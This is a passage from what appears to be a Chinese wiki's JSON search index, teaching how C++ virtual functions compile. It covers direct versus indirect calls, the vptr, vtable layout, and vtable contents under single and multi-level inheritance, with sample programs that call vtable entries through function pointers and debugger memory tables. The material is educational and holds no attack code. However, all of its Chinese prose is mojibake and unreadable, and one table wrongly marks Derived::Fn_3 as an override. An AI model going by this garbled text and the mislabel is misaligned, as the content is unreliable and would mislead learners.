PrintBase(b); printf(&quot; &quot;); Derived d; PrintBase(d); return 0;&#125; Print()åœ¨è™šè¡¨ç¬¬1é¡¹ï¼Œcall [edx]ï¼›Print2()åœ¨è™šè¡¨ç¬¬2é¡¹ï¼Œcall [edx+4] åæ±‡ç¼–çª—å£ï¼ŒCtrl+Gè¾“å…¥è·Ÿè¿›è¿™ä¸ªåœ°å€ bå¯¹è±¡å†…å­˜å¸ƒå±€ å€¼ è™šè¡¨è¡¨é¡¹ å†…å®¹ vptr 0x00422e80-&gt; 0x00422e80 00401014ï¼ŒBase::Printå‡½æ•°åœ°å€ x 0x00422e84 00401023ï¼ŒBase::Print2å‡½æ•°åœ°å€ y då¯¹è±¡å†…å­˜å¸ƒå±€ å€¼ è™šè¡¨è¡¨é¡¹ å†…å®¹ vptr 0x00422eb8-&gt; 0x0040100A 0040100Aï¼ŒDerived::Printå‡½æ•°åœ°å€ x 0x00401023 00401023ï¼ŒBase::Print2å‡½æ•°åœ°å€ y z å°ç»“ å¸¦æœ‰è™šå‡½æ•°çš„ç±»ï¼Œå…¶å¯¹è±¡èµ·å§‹å¤„æ˜¯vptrï¼Œç„¶åæ‰æ˜¯æˆå‘˜å˜é‡ã€‚vptræŒ‡å‘vtableï¼Œvtableä¸­ä¾æ¬¡å­˜æ”¾ç±»ä¸­è™šå‡½æ•°çš„å‡½æ•°åœ°å€ï¼ˆè™šå‡½æ•°åœ¨ç±»ä¸­å†™çš„å…ˆåé¡ºåºï¼‰ï¼Œæœ‰å‡ ä¸ªè™šå‡½æ•°ï¼Œè™šè¡¨ä¸­å°±æœ‰å‡ ä¸ªåœ°å€ã€‚ å¦‚æœå­ç±»æ²¡æœ‰å¯¹åŸºç±»å£°æ˜çš„è™šå‡½æ•°è¿›è¡Œé‡å†™ï¼ˆoverrideï¼‰ï¼Œé‚£ä¹ˆè¡¨é¡¹ä¸­çš„æ˜¯çˆ¶ç±»çš„è™šå‡½æ•°åœ°å€ã€‚å¦‚æœé‡å†™äº†ï¼Œè¿™ä¸€é¡¹åˆ™æ˜¯å­ç±»é‡å†™çš„å‡½æ•°åœ°å€ã€‚"},{"title":"è™šå‡½æ•°","path":"/wiki/C++/è™šå‡½æ•°.html","content":"ç›´æ¥è°ƒç”¨å’Œé—´æ¥è°ƒç”¨ 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;class Base &#123; public: void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125; &#125;; int main()&#123; //value Base b; b.Function_1(); b.Function_2(); //pointer Base* pb=&amp;b; pb-&gt;Function_1(); pb-&gt;Function_2(); //reference Base&amp; f=b; f.Function_1(); f.Function_2(); return 0;&#125; by valueby pointerby reference æ™®é€šæˆå‘˜å‡½æ•° virtualå‡½æ•° by value ç›´æ¥callï¼ŒE8 Call ç›´æ¥callï¼ŒE8 Call by pointer ç›´æ¥callï¼ŒE8 Call é—´æ¥callï¼ŒFF Call by reference ç›´æ¥callï¼ŒE8 Call é—´æ¥callï¼ŒFF Call å°ç»“ é€šè¿‡å¯¹è±¡è°ƒç”¨æ—¶ï¼Œvirtualå‡½æ•°ä¸æ™®é€šæˆå‘˜å‡½æ•°éƒ½æ˜¯ç›´æ¥è°ƒç”¨ï¼ŒE8 Call é€šè¿‡æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨æ—¶ï¼Œvirtualå‡½æ•°æ˜¯é—´æ¥callï¼ŒFF Call åªæœ‰é€šè¿‡æŒ‡é’ˆ/å¼•ç”¨ä¸”è°ƒç”¨çš„æ˜¯è™šå‡½æ•°ï¼Œæ‰æ˜¯é—´æ¥è°ƒç”¨ï¼ŒFF Call ç±»çš„å¤§å° ç±»ä¸­æ— è™šå‡½æ•°ç±»ä¸­æœ‰ä¸€ä¸ªè™šå‡½æ•°ç±»ä¸­æœ‰ä¸¤ä¸ªè™šå‡½æ•°12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125;&#125;;int main()&#123; Base b; printf(&quot;%x &quot;, sizeof(b)); return 0;&#125; 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125;&#125;;int main()&#123; Base b; printf(&quot;%x &quot;, sizeof(b)); return 0;&#125; 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125;&#125;;int main()&#123; Base b; printf(&quot;%x &quot;, sizeof(b)); return 0;&#125; å¤§å° æ˜¯è° ç±»ä¸­æ— è™šå‡½æ•° 8 xï¼Œy ç±»ä¸­æœ‰ä¸€ä¸ªè™šå‡½æ•° 0xC 4å­—èŠ‚+xï¼Œy ç±»ä¸­æœ‰ä¸¤ä¸ªè™šå‡½æ•° 0xC 4å­—èŠ‚+xï¼Œy å½“ç±»ä¸­æœ‰è™šå‡½æ•°åï¼ˆæœ‰1ä¸ªå’Œæœ‰100ä¸ªçš„æƒ…å†µä¸€æ ·ï¼‰ï¼Œå¯¹è±¡èµ·å§‹ä½ç½®å¤šäº†ä¸€ä¸ª4å­—èŠ‚çš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€æŒ‡å‘ä¸€å¼ è¡¨ï¼Œé‡Œé¢å­˜å‚¨äº†æ‰€æœ‰è™šå‡½æ•°çš„åœ°å€ã€‚ ä»¥ç±»ä¸­æœ‰ä¸¤ä¸ªè™šå‡½æ•°ä¸ºä¾‹ï¼Œåœ¨Memoryçª—å£çœ‹è¿™ä¸ªåœ°å€æŒ‡å‘çš„æ•°ç»„ä¸­çš„å€¼ è¿™ä¸ªåœ°å€ç§°ä¸ºè™šå‡½æ•°åœ°å€è¡¨æŒ‡é’ˆï¼Œvpointerï¼Œvptr è¿™ä¸ªæ•°ç»„è¢«ç§°ä¸ºè™šå‡½æ•°åœ°å€è¡¨ï¼ˆç®€ç§°è™šè¡¨ï¼‰ï¼Œvirtualtableï¼Œvtable è¯æ˜æ•°ç»„ä¸­å­˜çš„æ˜¯å‡½æ•°åœ°å€ å¦‚æœå­˜çš„æ˜¯å‡½æ•°åœ°å€ï¼Œè¯´æ˜å¯ä»¥ç”¨å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Function_3... &quot;); &#125;&#125;;int main()&#123; Base base; //å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚å°±æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;b çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;,*(int*)&amp;base); //é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;3;i++) &#123; int temp = *((int*)(*(int*)&amp;base)+i); pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; 123456789&amp;Base //Baseå¯¹è±¡çš„åœ°å€ï¼Œç±»å‹æ˜¯Base*(DWORD*)&amp;Base //Baseå¯¹è±¡çš„åœ°å€ï¼Œå¼ºè½¬ä¸ºDWORD*æŒ‡é’ˆç±»å‹*(DWORD*)&amp;Base //vptrçš„å€¼ï¼›å¯¹DWORD*ç±»å‹å–å€¼ï¼ŒDWORDæ˜¯4å­—èŠ‚ï¼Œæ‰€ä»¥ä»Baseå¯¹è±¡åœ°å€å¤„å¼€å§‹å–4å­—èŠ‚(DWORD*)(*(DWORD*)&amp;base) //å°†vptrçš„å€¼å¼ºè½¬ä¸ºDWORD*æŒ‡é’ˆç±»å‹(DWORD*)(*(DWORD*)&amp;base) + i //æŒ‡é’ˆ+iä¸ªDWORDå­—èŠ‚ï¼Œå°±æ˜¯è™šè¡¨ç¬¬ié¡¹*((DWORD*)(*(DWORD*)&amp;base)) //åŠ *å–å€¼ï¼Œå–å‡ºä»¥vpträ¸ºåœ°å€å¤„çš„å€¼ï¼Œå³è™šè¡¨é¡¹ç¬¬ä¸€é¡¹çš„å€¼ï¼ˆç¬¬ä¸€ä¸ªè™šå‡½æ•°åœ°å€ï¼‰*((DWORD*)(*(DWORD*)&amp;base) + i) //åŠ *å–å€¼ï¼Œå–å‡ºè™šè¡¨ç¬¬ié¡¹çš„å€¼ æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0x00422e94 0x0012FF6C x=1 0x0012FF70 y=2 è™šè¡¨ åœ°å€ å€¼ å†…å®¹ \"vptr->\"\" 0x00422E94 0x0040101E Base::Function_1å‡½æ•°åœ°å€ 0x00422E98 0x00401019 Base::Function_2å‡½æ•°åœ°å€ 0x00422E9C 0x00401023 Base::Function_3å‡½æ•°åœ°å€ å„æƒ…å†µä¸‹è™šè¡¨å†…å®¹æ¢æµ‹ æ— ç»§æ‰¿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2 called ... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Function_3 called ... &quot;); &#125;&#125;;int main()&#123; Base base; // å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚å°±æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;b çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD *)&amp;base); // é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void (*pFunction)(void); pFunction pFn; for (int i = 0; i &lt; 3; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;base) + i); pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Baseç±»ï¼š å˜é‡ï¼šxï¼Œy å‡½æ•° è™šå‡½æ•°Function_1 è™šå‡½æ•°Function_2 è™šå‡½æ•°Function_3 1class Base&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF74 vptr=0x00422038 0x0012FF78 x=1 0x0012FF7C y=2 è™šè¡¨ åœ°å€ å€¼ å†…å®¹ \"vptr->\"\" 0x00422038 0x00401014 Base::Function_1å‡½æ•°åœ°å€ 0x0042203C 0x00401005 Base::Function_2å‡½æ•°åœ°å€ 0x00422040 0x0040100a Base::Function_3å‡½æ•°åœ°å€ å•ç»§æ‰¿+æ— å‡½æ•°è¦†ç›– 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Base::Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Base::Function_2 called ... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Base::Function_3 called ... &quot;); &#125;&#125;;class Sub:public Base &#123;private: int z;public: Sub() &#123; z = 3; &#125; virtual void Function_4() &#123; printf(&quot;Sub::Function_4 called ... &quot;); &#125; virtual void Function_5() &#123; printf(&quot;Sub::Function_5 called ... &quot;); &#125; virtual void Function_6() &#123; printf(&quot;Sub::Function_6 called ... &quot;); &#125; &#125;; int main()&#123; Sub sub; // å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚å°±æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;Sub çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD*)&amp;sub); // é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void (*pFunction)(void); pFunction pFn; for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;sub) + i); pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; subå¯¹è±¡çš„vtableæ˜¯æœ‰6é¡¹ï¼Œå˜é‡ç›‘è§†çª—å£ä¼°è®¡åªæ˜¾ç¤ºäº†çˆ¶ç±»Baseçš„ï¼Œæ‰€ä»¥åªæ˜¾ç¤ºäº†3é¡¹ Baseç±»ï¼š å˜é‡ï¼šxï¼Œy å‡½æ•° è™šå‡½æ•°Function_1 è™šå‡½æ•°Function_2 è™šå‡½æ•°Function_3 Subç±»ï¼š å˜é‡ï¼šz å‡½æ•° è™šå‡½æ•°Function_4 è™šå‡½æ•°Function_5 è™šå‡½æ•°Function_6 12class Base&#123;...&#125;;class Sub:public Base&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0x0042303C 0x0012FF6C x=1 0x0012FF70 y=2 Sub 0x0012FF74 z=3 è™šè¡¨ åœ°å€ å€¼ å†…å®¹ \"vptr-> 0x0042303C 0x00401028 Base::Function_1å‡½æ•°åœ°å€ 0x00423040 0x0040100F Base::Function_2å‡½æ•°åœ°å€ 0x00423044 0x00401019 Base::Function_3å‡½æ•°åœ°å€ 0x00423048 0x00401023 Sub::Function_4å‡½æ•°åœ°å€ 0x0042304C 0x00401005 Sub::Function_5å‡½æ•°åœ°å€ 0x00423050 0x00401014 Sub::Function_6å‡½æ•°åœ°å€ å•ç»§æ‰¿+æœ‰å‡½æ•°è¦†ç›– 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Base::Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Base::Function_2 called ... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Base::Function_3 called ... &quot;); &#125;&#125;;class Sub:public Base &#123;private: int z;public: Sub() &#123; z = 3; &#125; virtual void Function_1() &#123; printf(&quot;Sub::Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Sub::Function_2 called ... &quot;); &#125; virtual void Function_6() &#123; printf(&quot;Sub::Function_6 called ... &quot;); &#125; &#125;; int main()&#123; Sub sub; // å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚å°±æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;Sub çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;, *(DWORD*)&amp;sub); // é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void (*pFunction)(void); pFunction pFn; for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;sub) + i); if(!temp) //è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Baseç±»ï¼š å˜é‡ï¼šxï¼Œy å‡½æ•° è™šå‡½æ•°Function_1 è™šå‡½æ•°Function_2 è™šå‡½æ•°Function_3 Subç±»ï¼š å˜é‡ï¼šz å‡½æ•° è™šå‡½æ•°Function_1ï¼Œoverride è™šå‡½æ•°Function_2ï¼Œoverride è™šå‡½æ•°Function_6 12class Base&#123;...&#125;;class Sub:public Base&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0x0042303C 0x0012FF6C x=1 0x0012FF70 y=2 Sub 0x0012FF74 z=3 è™šè¡¨ åœ°å€ å€¼ å†…å®¹ \"vptr-> 0x0042303C 0x00401023 Sub::Function_1å‡½æ•°åœ°å€ 0x00423040 0x00401014 Sub::Function_2å‡½æ•°åœ°å€ 0x00423044 0x00401019 Base::Function_3å‡½æ•°åœ°å€ 0x00423048 0x0040100F Sub::Function_6å‡½æ•°åœ°å€ å¤šç»§æ‰¿+æ— å‡½æ•°è¦†ç›– 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; virtual void Fn_4() &#123; printf(&quot;Derived::Fn_4 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_5() &#123; printf(&quot;SubDerived::Fn_5 called ... &quot;); &#125; virtual void Fn_6() &#123; printf(&quot;SubDerived::Fn_6 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //æŸ¥çœ‹ subderived çš„è™šå‡½æ•°è¡¨ SubDerived subderived; //è§‚å¯Ÿå¤§å° printf(&quot;%x &quot;,sizeof(subderived)); //æœ‰1ä¸ªè™šè¡¨ //å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;,*(DWORD*)&amp;subderived); //é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Baseç±»ï¼š å˜é‡ï¼ša,b å‡½æ•° è™šå‡½æ•°Fn_1 è™šå‡½æ•°Fn_2 Derivedç±»ï¼š å˜é‡ï¼šc å‡½æ•° è™šå‡½æ•°Fn_3 è™šå‡½æ•°Fn_4 SubDerivedç±»ï¼š å˜é‡ï¼šd å‡½æ•° è™šå‡½æ•°Fn_5 è™šå‡½æ•°Fn_6 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0042201C 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 è™šè¡¨ åœ°å€ å€¼ å†…å®¹ \"vptr-> 0x0042201C 0x00401032 Base::Fn_1å‡½æ•°åœ°å€ 0x00422020 0x0040104B Base::Fn_2å‡½æ•°åœ°å€ 0x00422024 0x00401055 Derived::Fn_3å‡½æ•°åœ°å€ 0x00422028 0x0040103C Derived::Fn_4å‡½æ•°åœ°å€ 0x0042202C 0x00401037 SubDerived::Fn_5å‡½æ•°åœ°å€ 0x00422030 0x00401041 SubDerived::Fn_6å‡½æ•°åœ°å€ å¤šç»§æ‰¿+æœ‰å‡½æ•°è¦†ç›– ä¾‹1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_1() &#123; printf(&quot;Derived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_5() &#123; printf(&quot;SubDerived::Fn_5 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //æŸ¥çœ‹ subderived çš„è™šå‡½æ•°è¡¨ SubDerived subderived; //è§‚å¯Ÿå¤§å° printf(&quot;%d &quot;,sizeof(subderived)); //æœ‰1ä¸ªè™šè¡¨ //å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;,*(DWORD*)&amp;subderived); //é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Baseç±»ï¼š å˜é‡ï¼ša,b å‡½æ•° è™šå‡½æ•°Fn_1 è™šå‡½æ•°Fn_2 Derivedç±»ï¼š å˜é‡ï¼šc å‡½æ•° è™šå‡½æ•°Fn_1ï¼Œoverride è™šå‡½æ•°Fn_3ï¼Œoverride SubDerivedç±»ï¼š å˜é‡ï¼šd å‡½æ•° è™šå‡½æ•°Fn_5 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0042201C 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 è™šè¡¨1 åœ°å€ å€¼ å†…å®¹ \"vptr1->\" 0x0042201C 0x0040105A Derived::Fn_1å‡½æ•°åœ°å€ 0x00422020 0x0040104B Base::Fn_2å‡½æ•°åœ°å€ 0x00422024 0x00401055 Derived::Fn_3å‡½æ•°åœ°å€ 0x00422028 0x00401037 SubDerived::Fn_5å‡½æ•°åœ°å€ ä¾‹2 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_1() &#123; printf(&quot;Derived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_1() &#123; printf(&quot;SubDerived::Fn_1 called ... &quot;); &#125; virtual void Fn_5() &#123; printf(&quot;SubDerived::Fn_5 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //æŸ¥çœ‹ subderived çš„è™šå‡½æ•°è¡¨ SubDerived subderived; //è§‚å¯Ÿå¤§å° printf(&quot;%d &quot;,sizeof(subderived)); //æœ‰1ä¸ªè™šè¡¨ //å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;,*(DWORD*)&amp;subderived); //é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Baseç±»ï¼š å˜é‡ï¼ša,b å‡½æ•° è™šå‡½æ•°Fn_1 è™šå‡½æ•°Fn_2 Derivedç±»ï¼š å˜é‡ï¼šc å‡½æ•° è™šå‡½æ•°Fn_1ï¼Œoverride è™šå‡½æ•°Fn_3 SubDerivedç±»ï¼š å˜é‡ï¼šd å‡½æ•° è™šå‡½æ•°Fn_1ï¼Œoverride è™šå‡½æ•°Fn_5 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0x00422048 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 è™šè¡¨1 åœ°å€ å€¼ å†…å®¹ \"vptr1->\" 0x00422048 0x00401019 SubDerived::Fn_1å‡½æ•°åœ°å€ 0x0042204C 0x0040101E Base::Fn_2å‡½æ•°åœ°å€ 0x00422050 0x00401032 Derived::Fn_3å‡½æ•°åœ°å€ 0x00422054 0x0040100A SubDerived::Fn_5å‡½æ•°åœ°å€ ä¾‹3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_1() &#123; printf(&quot;SubDerived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;SubDerived::Fn_3 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //æŸ¥çœ‹ subderived çš„è™šå‡½æ•°è¡¨ SubDerived subderived; //è§‚å¯Ÿå¤§å° printf(&quot;%d &quot;,sizeof(subderived)); //æœ‰1ä¸ªè™šè¡¨ //å¯¹è±¡çš„å‰å››ä¸ªå­—èŠ‚æ˜¯è™šå‡½æ•°è¡¨åœ°å€ printf(&quot;subderived çš„è™šå‡½æ•°è¡¨åœ°å€ä¸ºï¼š%x &quot;,*(DWORD*)&amp;subderived); //é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼ŒéªŒè¯æ­£ç¡®æ€§ typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //è¯»è™šè¡¨å†…å®¹è¯»å¤šäº†ï¼Œå°±breakï¼Œç»“æŸå½“å‰æ•´ä¸ªå¾ªç¯ç»“æ„ &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Baseç±»ï¼š å˜é‡ï¼ša,b å‡½æ•° è™šå‡½æ•°Fn_1 è™šå‡½æ•°Fn_2 Derivedç±»ï¼š å˜é‡ï¼šc å‡½æ•° è™šå‡½æ•°Fn_3 SubDerivedç±»ï¼š å˜é‡ï¼šd å‡½æ•° è™šå‡½æ•°Fn_1ï¼Œoverride è™šå‡½æ•°Fn_3ï¼Œoverride 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; æ‰€å±ç±» åœ°å€ æˆå‘˜å˜é‡ Base 0x0012FF68 vptr=0x00422048 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 è™šè¡¨1 åœ°å€ å€¼ å†…å®¹ \"vptr1->\" 0x00422048 0x00401019 SubDerived::Fn_1å‡½æ•°åœ°å€ 0x0042204C 0x0040101E Base::Fn_2å‡½æ•°åœ°å€ 0x00422050 0x00401037 SubDerived::Fn_3å‡½æ•°åœ°å€ å¤šé‡ç»§æ‰¿+æ— å‡½æ•°è¦†ç›– 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base1&#123;private: int a; 